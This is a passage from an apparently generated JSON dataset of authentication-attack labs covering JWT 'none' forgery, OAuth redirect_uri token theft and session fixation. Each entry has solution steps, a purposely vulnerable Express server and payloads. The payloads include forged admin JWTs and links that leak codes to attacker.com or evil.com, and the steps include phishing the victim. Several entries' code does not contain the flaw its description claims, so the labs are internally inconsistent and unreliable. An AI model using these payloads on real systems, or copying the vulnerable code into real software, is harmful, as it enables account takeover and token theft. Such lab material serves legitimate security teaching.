          "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'topsecret'; const users = { 'carlos': 'hunter2' }; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username, admin: false }, secret); res.json({ token }); } else { res.status(401).json({ error: 'Unauthorized' }); } }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.admin) return res.send('Admin Dashboard'); res.status(403).send('Access Denied'); } catch { res.status(400).send('Invalid Token'); } }); app.listen(4001);",
          "payloads": [
            "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsImFkbWluIjp0cnVlfQ.",
            "Authorization: Bearer [forged_none_algo_token]"
          ]
        },
        {
          "Lab scenario": "OAuth misconfiguration with open redirect on callback endpoint",
          "Lab Description": "The application uses OAuth for third-party login, but the redirect_uri parameter is not properly validated. This allows attackers to manipulate the OAuth flow and leak authorization codes or access tokens to malicious domains. To solve: Capture Carlosâ€™s access token via redirect hijack and access his profile.",
          "Difficulty Level": "Hard",
          "Solution Steps": [
            "Use OWASP ZAP to intercept the OAuth login flow and locate the redirect_uri in the authorization request.",
            "Replace redirect_uri with a malicious domain under your control (e.g., https://evil.com/callback).",
            "Send the modified OAuth login link to Carlos and trigger login via phishing or XSS.",
            "Capture the authorization code sent to your server and exchange it for an access token.",
            "Use the stolen access token in Authorization header to access /user/profile."
          ],
          "Vulnerability name": "Authentication",
          "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; const code = 'mock_code_123'; res.redirect(redirect + '?code=' + code); }); app.get('/callback', async (req, res) => { const code = req.query.code; try { const tokenRes = await axios.post('https://oauth-provider/token', { code }); const token = tokenRes.data.access_token; res.send('Logged in with token: ' + token); } catch { res.status(500).send('OAuth Error'); } }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos_oauth_token') { res.send('Carlos profile'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4002);",
          "payloads": [
            "https://app.com/auth?redirect_uri=https://evil.com/callback",
            "Authorization: Bearer carlos_oauth_token"
          ]
        }
      ,
      {
        "Lab scenario": "JWT tampering via none algorithm in Authorization header",
        "Lab Description": "The application implements JWT-based authorization but does not properly validate the signing algorithm. It accepts tokens with the 'alg' field set to 'none', allowing attackers to craft unsigned tokens. The application processes JWTs sent via the 'Authorization: Bearer' header. To solve: forge a valid JWT for the user 'carlos' and access his account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Postman or Burp Suite to capture the Authorization header after a successful login.",
          "Decode the JWT using jwt.io or jwt_tool and observe the 'alg' value in the header section.",
          "Modify the JWT by replacing the 'alg' value with 'none', and change the payload to {\"username\":\"carlos\"}. Remove the signature completely.",
          "Send the modified token using the Authorization: Bearer header in a GET request to /my-account endpoint.",
          "Verify successful access to Carlos's account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { carlos: 'admin123' }; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(401).send('Invalid token'); const payload = jwt.verify(token, 'secret', { algorithms: ['HS256', 'none'] }); if (payload.username === 'carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ICJjYXJsb3MifQ==."
        ]
      }
      ,
      {
        "Lab scenario": "Session fixation via login endpoint",
        "Lab Description": "The session ID is generated and sent to the client before authentication. Upon successful login, the same session ID is preserved instead of issuing a new one. This allows an attacker to fix a session ID for the victim. To solve: fix the session ID before Carlos logs in, then use the same session to access his account after he logs in.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to generate a session by visiting /login page before authentication and intercept the Set-Cookie response containing sessionID.",
          "Send a phishing link to Carlos that causes him to log in using that same sessionID (assume he logs in via crafted link).",
          "Once Carlos logs in, reuse the same sessionID cookie value to access /my-account endpoint.",
          "Send the sessionID in your cookie header using Burp Repeater to GET /my-account.",
          "Verify access to Carlosâ€™s account using fixed session."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'keyboard-cat', resave: false, saveUninitialized: true })); const users = { carlos: 'secure123' }; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.send('Logged in'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Account details for carlos'); else res.status(403).send('Access denied'); }); app.listen(4000);",
        "payloads": [
          "Cookie: connect.sid=attackerFixedSessionID",
          "GET /my-account HTTP/1.1 with attackerFixedSessionID after victim login"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth implicit flow redirection manipulation",
        "Lab Description": "The app uses OAuth implicit flow for authentication. The redirection URL validation is flawed, allowing attackers to steal tokens by injecting a malicious redirect_uri. The app accepts OAuth token from third-party providers and uses them to authenticate users via GET /oauth/callback. To solve: hijack Carlosâ€™s token by crafting a malicious redirect_uri that sends the token to your server.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp or Postman to analyze the OAuth authorization URL parameters, especially redirect_uri.",
          "Replace the redirect_uri parameter with a malicious value pointing to your server (e.g., https://attacker.com/callback).",
          "Send the malicious link to Carlos and make him click it (assume victim interaction).",
          "Intercept the fragment token at your server from Carlosâ€™s browser redirection.",
          "Replay the token in GET /oauth/callback?token=xyz to impersonate Carlos and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const token = req.query.token; if (token === 'carlos_token') { res.send('Welcome back, carlos!'); } else { res.send('Invalid token'); } }); app.get('/start-auth', (req, res) => { const redirect = req.query.redirect_uri; res.redirect(`${redirect}#token=carlos_token`); }); app.listen(4000);",
        "payloads": [
          "https://vulnerable-site.com/start-auth?redirect_uri=https://attacker.com/callback",
          "https://attacker.com/callback#token=carlos_token",
          "GET /oauth/callback?token=carlos_token"
        ]
      }
      ,
      {
        "Lab scenario": "JWT Signature None Bypass in API Token Validation",
        "Lab Description": "The API backend uses JWT for authentication, but fails to validate the signature properly when the `alg` header is manipulated. The application uses the token directly from the Authorization header to identify users without verifying the token's integrity. To solve: Forge a valid JWT token that grants admin access by bypassing the signature verification logic.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Postman to intercept and inspect the Authorization Bearer token from a normal login request.",
          "Decode the JWT using jwt.io or Burp Decoder and observe the algorithm used (`alg: HS256`).",
          "Modify the JWT header to `alg: none` and remove the signature part entirely.",
          "Craft a new payload with `{ \"role\": \"admin\", \"username\": \"carlos\" }` and encode the header and payload with base64url.",
          "Replace the Authorization header with the tampered token and access the `/admin` or `/my-account` endpoint to confirm privilege escalation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') { res.send('Admin access granted'); } else { res.send('User access only'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
        ]
      }
      ,
      {
        "Lab scenario": "Session Fixation in Login Token Parameter",
        "Lab Description": "The login flow uses a static session token passed in a GET parameter without proper regeneration after login. This allows a malicious actor to predetermine the victim's session ID. The application reflects the token into a cookie without regenerating it post-authentication. To solve: Fix the victim's session ID, force a login, and then reuse the session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to monitor the login flow and observe the use of `?session=` token in GET requests.",
          "Generate a session ID and pre-authenticate using it, confirming that it sets a `Set-Cookie: session` header with the same ID.",
          "Send the login link containing the malicious session ID to the victim.",
          "After the victim logs in using that link, reuse the same session cookie on your own browser or via Burp Repeater.",
          "Access `/my-account` with the hijacked session to confirm access to the victim's data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const session = req.query.session; res.cookie('session', session); res.send('<form method=\"POST\" action=\"/do-login\"><input name=\"user\"><input name=\"pass\"><input type=\"submit\"></form>'); }); app.post('/do-login', (req, res) => { res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.cookies.session === 'fixed-session-abc') res.send('Carlos account page'); else res.send('Invalid session'); }); const PORT = 4001; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "http://lab-url/login?session=fixed-session-abc",
          "Cookie: session=fixed-session-abc"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth Misconfiguration in Token Exchange Endpoint",
        "Lab Description": "The lab uses an OAuth provider for authentication but fails to validate the `redirect_uri` and `client_id` parameters. This enables an attacker to manipulate the authorization flow and exchange an arbitrary `code` for a victimâ€™s token. To solve: Hijack an access token using a rogue redirect URI and access Carlos's account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to analyze the OAuth flow and observe the exchange between `/auth`, `/callback`, and `/token`.",
          "Craft a GET request to `/auth` with a malicious `redirect_uri` pointing to your domain (e.g., https://attacker.com/callback) and a valid `client_id`.",
          "Send the link to the victim to trigger an OAuth code grant. Capture the code on your rogue redirect endpoint.",
          "Send a POST request to `/token` with the captured code and your malicious `redirect_uri`, bypassing the verification logic.",
          "Use the received access token to call `/my-account` as the victim."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const validCodes = { 'authcode123': 'token-for-carlos' }; app.post('/token', (req, res) => { const { code, redirect_uri } = req.body; if (validCodes[code]) { res.json({ access_token: validCodes[code] }); } else { res.status(400).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-carlos') res.send('Carlos account data'); else res.status(403).send('Access denied'); }); const PORT = 4002; app.listen(PORT, () => console.log(`OAuth Token Exchange Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "GET /auth?client_id=trusted-app&redirect_uri=https://attacker.com/callback",
          "POST /token { \"code\": \"authcode123\", \"redirect_uri\": \"https://attacker.com/callback\" }",
          "Authorization: Bearer token-for-carlos"
        ]
      }
      ,
      {
        "Lab scenario": "JWT signature verification bypass in Authorization middleware",
        "Lab Description": "The application uses JWTs for session management but fails to validate the token signature correctly when the `alg` header is set to 'none'. The backend simply decodes the payload and grants access without cryptographic verification. To solve: forge a valid token for the user 'admin' and access the /admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept a request after logging in with a normal user using Burp Suite and extract the JWT from the Authorization header.",
          "Decode the JWT using jwt.io and observe the alg field is set to 'HS256'. Modify it to 'none'.",
          "Craft a new payload with { \"user\": \"admin\" }, set alg to 'none', and leave the signature empty.",
          "Use Postman or Burp to send a request to /admin with the forged token in the Authorization header.",
          "Verify access to the admin dashboard and check for a flag or message confirming successful privilege escalation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user1', role: 'user' }]; const jwtSecret = 'supersecretkey'; app.use((req, res, next) => { const auth = req.headers.authorization; if (auth && auth.startsWith('Bearer ')) { const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { req.user = decoded.payload; return next(); } try { req.user = jwt.verify(token, jwtSecret); return next(); } catch (e) { return res.status(401).send('Invalid token'); } } res.status(401).send('No token provided'); }); app.get('/admin', (req, res) => { if (req.user && req.user.user === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Forbidden'); } }); app.listen(3000, () => console.log('JWT Lab running on port 3000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
          "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
        ]
      }
      ,
      {
        "Lab scenario": "Open redirect in OAuth flow in redirect_uri parameter",
        "Lab Description": "This labâ€™s OAuth implementation contains an open redirect vulnerability in the `redirect_uri` parameter. The authorization server does not validate the redirect destination properly. To solve: steal the OAuth authorization code of another user by injecting a crafted redirect_uri that forwards the code to your attacker-controlled domain.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to proxy and observe the initial OAuth request sent to the authorization endpoint.",
          "Identify the redirect_uri parameter and test injecting a value like https://attacker.com/callback.",
          "Craft a phishing link to the victim using the modified redirect_uri to send the authorization code to your server.",
          "Deploy a basic listener (e.g., using ngrok or requestbin) and receive the stolen code.",
          "Manually exchange the stolen code for a token using Postman and access the victimâ€™s resource."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, response_type, client_id } = req.query; if (!redirect_uri || !response_type || !client_id) { return res.status(400).send('Missing parameters'); }  const authCode = 'AUTH12345'; res.redirect(`${redirect_uri}?code=${authCode}`); }); app.listen(4000, () => console.log('OAuth Redirection Lab running on port 4000'));",
        "payloads": [
          "https://victim.com/oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/callback&response_type=code",
          "https://auth.vulnapp.com/auth?client_id=test&redirect_uri=https://evil.com&response_type=code"
        ]
      }
      ,
      {
        "Lab scenario": "Session fixation vulnerability in login endpoint via cookie injection",
        "Lab Description": "The login flow does not generate a new session upon authentication. This allows attackers to set a known session ID before login, then trick a victim into logging in with it. To solve: fixate a known session ID for Carlos and access /my-account using the same session ID.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to send a GET /login request with a custom session cookie (e.g., sessionid=abc123).",
          "Trick the victim into logging in while using this same session ID (simulate or assume they log in with that session cookie).",
          "Once authenticated, use the same session ID to access the authenticated userâ€™s /my-account page.",
          "Confirm the session contains Carlos's data without re-authentication.",
          "Verify unauthorized access to account data and session reuse confirmation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'supersecure' }]; let sessions = {}; app.get('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const sessId = req.cookies.sessionid; if (sessId) { sessions[sessId] = username; res.send('Logged in'); } else { res.status(400).send('Session ID missing'); } } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) { res.send(`Account details for ${user}`); } else { res.status(403).send('Access Denied'); } }); app.listen(5000, () => console.log('Session Fixation Lab running on port 5000'));",
        "payloads": [
          "Cookie: sessionid=attackersession",
          "GET /login?username=carlos&password=supersecure HTTP/1.1\\nCookie: sessionid=attackersession",
          "GET /my-account HTTP/1.1\\nCookie: sessionid=attackersession"
        ]
      }
      ,
      {
        "Lab scenario": "Session fixation in login flow",
        "Lab Description": "This lab contains a session fixation vulnerability in the login flow. The application reuses the session identifier set prior to authentication. The application sets a session cookie before login and does not regenerate it upon successful authentication. To solve: log in as Carlos by leveraging a fixed session identifier to hijack his session.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite Proxy to capture a request to /login and note the session cookie set before logging in.",
          "Send the GET /login request to Burp Repeater. Log out and change the session cookie to match your original session.",
          "Craft a phishing link or client-side JS that forces the victim (Carlos) to log in while having your session ID.",
          "Wait or simulate a login by Carlos using your fixed session ID.",
          "Access /my-account with the hijacked session and confirm access to Carlosâ€™s account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixme', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.username = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.authenticated) { res.send(`Welcome back, ${req.session.username}`); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Set-Cookie: connect.sid=fixedSessionId;",
          "Phishing link: http://lab.com/login?sid=fixedSessionId",
          "Session reuse during victim login"
        ]
      }
      ,
      {
        "Lab scenario": "JWT token tampering via 'none' algorithm",
        "Lab Description": "This lab uses JSON Web Tokens (JWT) for user sessions but fails to enforce a valid signing algorithm. It accepts tokens signed with 'none', allowing users to forge tokens without a signature. To solve: Forge a JWT with 'admin' privileges and access the admin panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept a valid JWT using Burp Suite Proxy or Postman during a login.",
          "Decode the JWT using jwt.io and observe the algorithm is HS256.",
          "Modify the JWT header to use \"alg\":\"none\" and set payload to {\"username\":\"admin\",\"role\":\"admin\"}.",
          "Remove the signature portion of the JWT completely.",
          "Set the modified JWT in Authorization header and access /admin-panel."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'topsecret'; const users = [{ username: 'admin', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username, role: 'admin' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Unauthorized'); } }); app.get('/admin-panel', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); if (decoded.role === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Forbidden'); } } catch { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
          "Payload: {\"username\":\"admin\",\"role\":\"admin\"}",
          "JWT: <base64(header)>.<base64(payload)>."
        ]
      }
      ,
      {
        "Lab scenario": "OAuth misconfiguration with open redirect in redirect_uri",
        "Lab Description": "This lab implements OAuth 2.0 login using a third-party provider but fails to validate redirect_uri properly. An attacker can inject an external redirect to exfiltrate tokens. To solve: Steal an access token by exploiting an open redirect and use it to access Carlosâ€™s profile page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP or Burp to capture the OAuth authorization URL.",
          "Modify the redirect_uri parameter to point to a domain you control (e.g., https://attacker.com/callback).",
          "Send a phishing link to the victim or simulate their login flow.",
          "Receive the access token on your callback endpoint.",
          "Replay the token to /profile using Authorization: Bearer <stolen_token> to access Carlosâ€™s profile."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const CLIENT_ID = 'abc123'; const REDIRECT_URIS = ['http://localhost:4000/callback']; app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; res.redirect(`https://oauth.provider.com/auth?client_id=${CLIENT_ID}&redirect_uri=${redirect}`); }); app.get('/callback', async (req, res) => { const { code } = req.query; const token = await axios.post('https://oauth.provider.com/token', { code }); res.send('Logged in with token: ' + token.data.access_token); }); app.get('/profile', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer supersecrettoken') { res.send('Carlos profile page'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://lab.com/auth?redirect_uri=https://attacker.com/callback",
          "Captured Token: Bearer supersecrettoken",
          "Phishing link with poisoned redirect_uri"
        ]
      }
      ,
      {
        "Lab scenario": "Session Fixation in REST-based login flow",
        "Lab Description": "This lab implements RESTful authentication via session cookies but fails to regenerate the session ID upon successful login. The application incorrectly trusts session state established prior to login. To solve: Fixate a session for Carlos and gain access to his account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use OWASP ZAP to initiate an unauthenticated session and capture the Set-Cookie header from GET /login",
          "Send multiple GET requests to confirm session ID is reused even after login",
          "Use Postman to manually log in as carlos while reusing the fixated session ID",
          "Observe that authentication completes without regenerating session ID, giving access",
          "Send GET /my-account with the fixated cookie and confirm access to Carlos's account"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'supersecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'carlospass' }]; app.get('/login', (req, res) => { res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.send('Logged in'); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Carlos Account Access'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
        "payloads": [
          "Session-ID reuse before and after POST /login",
          "GET /my-account with fixated session cookie",
          "POST /login with valid creds and pre-injected JSESSIONID"
        ]
      }
      ,
      {
        "Lab scenario": "JWT None Algorithm Authentication Bypass",
        "Lab Description": "The app uses JSON Web Tokens for user sessions but fails to validate the JWT signature algorithm properly. It accepts unsigned tokens if 'alg' is set to 'none'. To solve: Modify the JWT to impersonate Carlos without a valid signature and access the protected resource.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to capture a valid JWT token from your account login response",
          "Decode the token using jwt.io and observe the 'alg' header is RS256",
          "Replace 'alg' with 'none' and change 'sub' or 'username' field to carlos",
          "Strip the signature and construct a new token with header.payload.",
          "Send the tampered token in Authorization: Bearer header and access /account"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'jwtpass' }]; const privateKey = 'PRIVATE_KEY'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, privateKey, { algorithm: 'RS256' }); res.json({ token }); } else { res.status(401).send('Invalid login'); } }); app.get('/account', (req, res) => { const auth = req.headers['authorization']; const token = auth?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'carlos') res.send('Welcome Carlos'); else res.status(403).send('Access Denied'); }); app.listen(4000);",
        "payloads": [
          "JWT with header: {\"alg\":\"none\"}",
          "Payload: {\"username\":\"carlos\"}",
          "Authorization: Bearer header with unsigned JWT"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth Misconfiguration with Open Redirect in Callback",
        "Lab Description": "This app uses OAuth2 with an authorization code grant flow. However, the redirect_uri parameter is not properly validated, allowing redirection to attacker-controlled domains. To solve: Steal the authorization code of Carlos via a crafted OAuth login URL and gain access to his token-protected account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept the OAuth redirect URL during login initiation",
          "Modify the redirect_uri to point to your public request bin or attacker server",
          "Send the crafted OAuth login link to the victim (Carlos)",
          "Capture the authorization code redirected to your server",
          "Exchange the stolen code for an access token and use it to call /account"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const authCode = 'auth123'; res.redirect(redirect_uri + '?code=' + authCode); }); app.get('/token', (req, res) => { const { code } = req.query; if (code === 'auth123') res.json({ access_token: 'token-for-carlos' }); else res.status(403).send('Invalid code'); }); app.get('/account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'token-for-carlos') res.send('Carlos OAuth Account'); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "https://example.com/auth?client_id=123&redirect_uri=https://attacker.com/callback",
          "Captured code=auth123 from callback",
          "GET /token?code=auth123 -> extract access_token",
          "Authorization: Bearer token-for-carlos"
        ]
      }
      
]